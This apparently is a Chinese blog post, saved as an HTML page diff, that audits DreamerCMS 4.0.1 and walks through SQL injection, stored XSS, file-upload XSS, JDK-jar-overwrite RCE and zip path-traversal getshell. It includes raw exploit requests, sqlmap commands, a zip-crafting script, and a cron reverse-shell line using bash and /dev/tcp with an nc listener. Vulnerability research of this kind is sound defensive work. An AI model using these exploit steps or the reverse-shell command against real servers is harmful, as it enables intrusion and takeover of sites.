@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Yu9">
+    
+    <title>
+        
+            DreamerCMS_4.0.1代码审计 |
+        
+        Yu9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/blog/images/logo.png">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/blog/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"wsyu9a.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#999999","title":"Yu9's Blog","author":"Yu9","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"Home":"/","Archives":"/archives","Tags":"/tags","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bgc.png","background_img_dark":"/images/bgc.png","description":"Runtime.getRuntime().exec(\"变有钱\")","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/wsYu9a","weixin":"img | /images/wechat.jpg"}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"category":false,"tag":true,"announcement":null},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":true,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":true,"css":["/css/custom.css"]},"root":"/blog","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/blog/">
+                    <img src="/blog/images/logo.png">
+                </a>
+            
+            <a class="site-name border-box" href="/blog/">
+               Yu9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        DreamerCMS_4.0.1代码审计
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/blog/images/avatar.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Yu9</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-02-01</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 19 2024 02:59:46 GMT+0000">2024-03-19</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>7 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>全局搜索${</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/21/65d5f763be61e.png"  alt="image-20240201230613493"></p>
+<p>定位到这块<code>dreamer_cms_4.0.1\src\main\resources\mapping\ArchivesMapper.xml</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbad014b358.png"  alt="image-20240201223856519"></p>
+<p>向上跟进找到接口调用处</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbadcc5d4d8.png"  alt="image-20240201224219640"></p>
+<p>继续向上寻找，发现有两处调用<code>queryListByKeywords</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd39c1b1a6e.png"  alt="image-20240203025144262"></p>
+<h3 id="后台首页搜索处存在SQL注入"><a href="#后台首页搜索处存在SQL注入" class="headerlink" title="后台首页搜索处存在SQL注入"></a>后台首页搜索处存在SQL注入</h3><p>我们分析，先定位到第一处<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\service\impl\ArchivesServiceImpl.java</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbadec26fb0.png"  alt="image-20240201224251265"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbae28c7b4a.png"  alt="image-20240201224351906"></p>
+<p>在向上寻找<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\controller\admin\SearchController.java</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbae75835a7.png"  alt="image-20240201224509010"></p>
+<p>该功能点在首页搜索处</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbaf5c0de2e.png"  alt="image-20240201224859444"></p>
+<p>抓包并把keyword参数改为<code>typeid</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbaf945bc68.png"  alt="image-20240201224955881"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/search/doSearch HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Referer: http://127.0.0.1:8888/admin/search//doSearch</span><br><span class="line">Cookie: dreamer-cms-s=d88b060d-b171-4dd7-8edb-f23c2a804bad</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Origin: http://127.0.0.1:8888</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">entity%5B%27typeid%27%5D=*</span><br></pre></td></tr></table></figure>
+
+<p>保存文件、sqlmap一把梭：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -level=5</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbacdc12b3b.png"  alt="image-20240201223818762"></p>
+<h3 id="前台首页搜索处存在SQL注入"><a href="#前台首页搜索处存在SQL注入" class="headerlink" title="前台首页搜索处存在SQL注入"></a>前台首页搜索处存在SQL注入</h3><p>刚刚我们分析过后还有一处也调用了<code>queryListByKeywords</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3a247e85f.png"  alt="image-20240203025323191"></p>
+<p>位置在<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\taglib\tags\PageListTag.java</code></p>
+<p>删了一些没有关系的，留了点比较重要的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public String parse(String html, SearchEntity params) </span><br><span class="line"></span><br><span class="line">	Map&lt;String,Object&gt; searchParams = new HashMap&lt;String,Object&gt;();</span><br><span class="line">	</span><br><span class="line">	String keywords = params.getEntity().get(&quot;keywords&quot;).toString();</span><br><span class="line">	searchParams.put(&quot;keywords&quot;, keywords);</span><br><span class="line">	</span><br><span class="line">	if(params.getEntity().containsKey(&quot;typeid&quot;) &amp;&amp; StringUtil.isNotBlank(params.getEntity().get(&quot;typeid&quot;))) &#123;</span><br><span class="line">		String typeid = params.getEntity().get(&quot;typeid&quot;).toString();</span><br><span class="line">		typeid = typeid.replace(&quot;,&quot;, &quot;&#x27;,&#x27;&quot;);</span><br><span class="line">		searchParams.put(&quot;typeid&quot;, &quot;&#x27;&quot; + typeid + &quot;&#x27;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	for (int i = 0;i &lt; listTags.size();i++) &#123;</span><br><span class="line">		</span><br><span class="line">		List&lt;ArchivesVo&gt; list = archivesMapper.queryListByKeywords(searchParams);</span><br><span class="line">		</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>可以看到先创建了一个<code>searchParams</code>的集合，之后就是把<code>typeid</code>参数放进这个集合没有任何过滤。</p>
+<p>接着就是继续寻找<code>parse</code>方法的调用处，看看在这之前有没有做啥过滤。同样是在当前路径下的<code>parsePageList</code>方法</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3d11275c7.png"  alt="image-20240203030552036"></p>
+<p>可以看到也是没有做任何过滤</p>
+<p>那就继续向上寻找，最终是定位到<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\controller\FrontController.java</code></p>
+<p>在<code>/search</code>下接受的<code>params</code>实体类，那就看他中有没有对<code>typeid</code>参数过滤</p>
+<p>对<code>typeid</code>参数没有处理，但是这块做了一些限制。若不满足，就会终止：</p>
+<ul>
+<li>必须包含entity[‘keywords’]、pageNum、pageSize这三个参数（pageNum、pageSize参数有给默认值，我们发请求不携带也OK）</li>
+<li>keywords不能少于5个字符</li>
+</ul>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3f0354934.png"  alt="image-20240203031410200"></p>
+<p>所以我们满足这两个条件即可！</p>
+<p>我们在页面中找到该接口在前台搜索处</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3f8bbf988.png"  alt="image-20240203031626423"></p>
+<p>抓包、添加entity[‘typeid’]参数，并且保证keywords长度大于5.</p>
+<p>保存数据包sqlmap一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test2.txt -level=5</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Origin: http://127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Referer: http://127.0.0.1:8888/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: dreamer-cms-s=3b69bad5-b1b3-4d47-b2b4-2938b036f7c5</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">entity%5B%27keywords%27%5D=qwert&amp;entity%5B%27typeid%27%5D=*</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd402385dbe.png"  alt="image-20240203031858196"></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="前台首页储存型XSS"><a href="#前台首页储存型XSS" class="headerlink" title="前台首页储存型XSS"></a>前台首页储存型XSS</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc88f98c7cb.png"  alt="image-20240202141728147"></p>
+<p>前台刷新页面触发</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc891c0fca3.png"  alt="image-20240202141803303"></p>
+<p>数据包</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc897079d42.png"  alt="image-20240202141927606"></p>
+<p>定位到<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\controller\admin\CategoryController.java</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc89ad57080.png"  alt="image-20240202142028468"></p>
+<p>没有做任何过滤就存到数据库中</p>
+<h3 id="后台附件管理文件任意文件上传导致xss"><a href="#后台附件管理文件任意文件上传导致xss" class="headerlink" title="后台附件管理文件任意文件上传导致xss"></a>后台附件管理文件任意文件上传导致xss</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd4331cc1f2.png"  alt="image-20240203033200809"></p>
+<p>抓包，可以看到文件路径</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd4373ae8e3.png"  alt="image-20240203033306512"></p>
+<p>然后访问即可，有点鸡肋</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd43ae945bd.png"  alt="image-20240203033405681"></p>
+<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p><a class="link"   target="_blank" rel="noopener" href="https://n1k0la-t.github.io/2023/01/31/DreamerCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >https://n1k0la-t.github.io/2023/01/31/DreamerCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><em>cc&#x2F;iteachyou&#x2F;cms&#x2F;controller&#x2F;admin&#x2F;TaskController.java#runTaskCron</em>调用了*Class.forName()*，参数可控。</p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201151939509.png"  alt="image-20230201151939509"></p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201015554062.png"  alt="image-20230201015554062"></p>
+<p>由于Java的懒加载，我们可以通过覆盖JDK安装路径下未被打开的jar包，在没有被加载的类的静态代码块中写入恶意代码，再利用此处的*Class.forName()*加载类，执行类中的静态代码。但是由此引发了一个问题，如何获取JDK安装路径？实际上，DreamerCMS的后台仪表盘已经为我们提供了JDK安装路径。</p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201021319148.png"  alt="image-20230201021319148"></p>
+<p>需要注意的是，在一些较低的JDK版本中，并不存在懒加载。</p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201023217750.png"  alt="image-20230201023217750"></p>
+<p>8u181</p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201112353963.png"  alt="image-20230201112353963"></p>
+<p>8u212</p>
+<p>这里选择覆盖没有被打开的*&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;jre&#x2F;lib&#x2F;ext&#x2F;zipfs.jar*，制作一个同名jar包。</p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201121012985.png"  alt="image-20230201121012985"></p>
+<p>制作恶意压缩文件，覆盖*&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;jre&#x2F;lib&#x2F;ext&#x2F;zipfs.jar*。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">zipFile = zipfile.ZipFile(&#x27;t.zip&#x27;, &#x27;a&#x27;, zipfile.ZIP_DEFLATED)</span><br><span class="line">zipFile.write(&#x27;zipfs.jar&#x27;, &#x27;../../../../../../../../../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/zipfs.jar&#x27;, zipfile.ZIP_DEFLATED)</span><br><span class="line">zipFile.close()</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201121831418.png"  alt="image-20230201121831418"></p>
+<p>最后添加计划任务并执行，通过任意文件读取漏洞读取命令执行结果。</p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201122618359.png"  alt="image-20230201122618359"></p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201122957570.png"  alt="image-20230201122957570"></p>
+<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201122922584.png"  alt="image-20230201122922584"></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/2183" >奇安信攻防社区-Dreamer CMS 代码审计 (butian.net)<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="后台压缩校验不正确导致Getshell"><a href="#后台压缩校验不正确导致Getshell" class="headerlink" title="后台压缩校验不正确导致Getshell"></a>后台压缩校验不正确导致Getshell</h3><p>漏洞效果</p>
+<p>我们先在 Linux 系统创建<code>..\*..\*..\*..\*..\*..\*..\*..\*..\*..\*var\*spool\*cron\*root</code>文件，并写入远连命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/7777 0&amp;gt;&amp;amp;1&quot;</span> &amp;gt; ..\*..\*..\*..\*..\*..\*..\*..\*..\*..\*<span class="keyword">var</span>\*spool\*cron\*root</span><br><span class="line">zip -r ./test3.zip ..\*..\*..\*..\*..\*..\*..\*..\*..\*..\*<span class="keyword">var</span>\*spool\*cron\*root</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a6b9d22b26328456606820c3f33d34b17d6f496d.png"  alt="8.png"><br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a1d9bdfd8c27e95ff6b7664bc53e9703c632ee23.png"  alt="image.png"><br>打包完后，通过风格管理上传该压缩包。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-107a16a037c005783006e03aeb0b148db5b5d99f.png"  alt="image.png"><br>提示主题描述不存在，问题不大，这说明解压完成了。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-5bbedcd2d814e04f880e292e3aa57bb73e1c8fca.png"  alt="image.png"><br>在后台日志输出也能看到解压完毕。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-2415ecdb6325dd4a0eada20009d0f880e18defd7.png"  alt="image.png"><br>接着我们到服务机器上看到我们的文件已经写进去了。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-4323ae5bea3f4f9ce02a0bcc6005f37bddaeea92.png"  alt="image.png"><br>通过<code>nc -lvvp 7777</code>成功获得服务器权限。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-3356fdbb6d7614503f610ffa271cad5060e5bb87.png"  alt="image.png"></p>
+<p>漏洞定位</p>
+<p>Controller文件：<code>src/main/java/cc/iteachyou/cms/controller/admin/ThemesController.java</code></p>
+<p><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e1512a35a58f3da4bca4d8916680f1c9b11065aa.png"  alt="image.png"><br>在添加主题中调用了<code>unZipFiles</code>，我们具体看看这个工具类方法。<br>工具类文件：<code>src/main/java/cc/iteachyou/cms/utils/ZipUtils.java</code></p>
+<p><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-1c5f367b0298781531205521ec8a7e540e46365b.png"  alt="image.png"><br>代码是常见的文件解压操作，针对压缩包内文件名做了<code>../</code>判断的校验，但在后面的代码里，使用正则将文件名内的<code>*</code>全部替换成路径符号<code>/</code>。值得注意的是，这里没有校验<code>..\</code>，这同样会造成目录穿越。<br><code>..*..*..*..*..*..*..*..*..*..*var\*spool\*cron\*root</code>变成<code>../../../../../../../../../../var/spool/cron/root</code>导致目录穿越的产生。在Linux情况下，我们可以写计划任务或者写SSH私钥可以达到获取服务器权限的目的。Window的情况下可以写恶意EXE到桌面钓鱼。</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/blog/2024/02/06/240206springboot%E9%9B%86%E6%88%90shiro/"
+                                   title="springboot集成shiro"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">springboot集成shiro</span>
+                                        <span class="post-nav-item">上一篇</span>
